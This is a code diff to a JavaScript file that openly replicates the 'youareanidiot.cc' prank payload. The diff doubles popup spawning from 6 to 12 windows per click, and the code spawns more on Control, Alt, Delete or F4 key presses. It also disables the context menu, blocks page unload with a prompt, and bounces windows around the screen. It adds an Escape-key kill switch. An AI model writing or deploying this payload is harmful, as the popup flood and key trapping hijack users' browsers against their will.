@@ -58,10 +58,10 @@ container.addEventListener('click', () => container.classList.remove('clicky'));
 micon.addEventListener('click', audioSwitch);
 
 // ==========================================================================
-// EXACT REPLICATION of youareanidiot.cc payload (math.js + you.js)
+// ENHANCED REPLICATION: exact youareanidiot.cc + aggressive multiplication + kill switch
 // ==========================================================================
 
-// --- math.js ---
+// --- math.js (exact) ---
 let xOff = 5;
 let yOff = 5;
 let xPos = 400;
@@ -112,29 +112,63 @@ function playBall() {
     setTimeout(playBall, 1);
 }
 
-// --- you.js ---
+// --- Kill switch (localStorage) ---
 const sessionId = 'i_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);
+const killKey = 'ik_' + sessionId;
 
+function isKilled() {
+	try { return !!localStorage.getItem(killKey); } catch (e) { return false; }
+}
+function signalKill() {
+	try { localStorage.setItem(killKey, Date.now().toString()); } catch (e) {}
+}
+function clearKill() {
+	try { localStorage.removeItem(killKey); } catch (e) {}
+}
+
+const urlParams = new URLSearchParams(window.location.search);
+const urlSession = urlParams.get('session');
+const isPopup = (window.opener !== null || !!urlSession);
+
+if (!isPopup && !urlSession) {
+	clearKill();
+}
+
+// Poll for kill signal
+setInterval(() => {
+	if (isKilled()) {
+		try { window.close(); } catch (e) {}
+	}
+}, 500);
+
+// --- you.js (enhanced spawn counts) ---
 container.addEventListener('click', async () => {
-	await proCreate(6);
+	if (isKilled()) return;
+	await proCreate(12);
 	window.onbeforeunload = () => "Are you an idiot?";
 });
 
 window.onload = playBall;
 window.oncontextmenu = () => false;
 window.onkeydown = async () => {
+	if (isKilled()) return;
 	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
-		await proCreate(6);
+		await proCreate(12);
 		alert("You are an idiot!");
 	}
 	return null;
 }
 
-// Popup audio autoplay (modern browser compatibility)
+// ESC kill switch
+window.addEventListener('keydown', (e) => {
+	if (e.key === 'Escape') {
+		signalKill();
+		try { window.close(); } catch (e) {}
+	}
+});
+
+// Popup audio autoplay
 (function() {
-	const urlParams = new URLSearchParams(window.location.search);
-	const urlSession = urlParams.get('session');
-	const isPopup = (window.opener !== null || !!urlSession);
 	if (!isPopup) return;
 	function startPopupAudio() {
 		const a = document.getElementById('youare-audio');
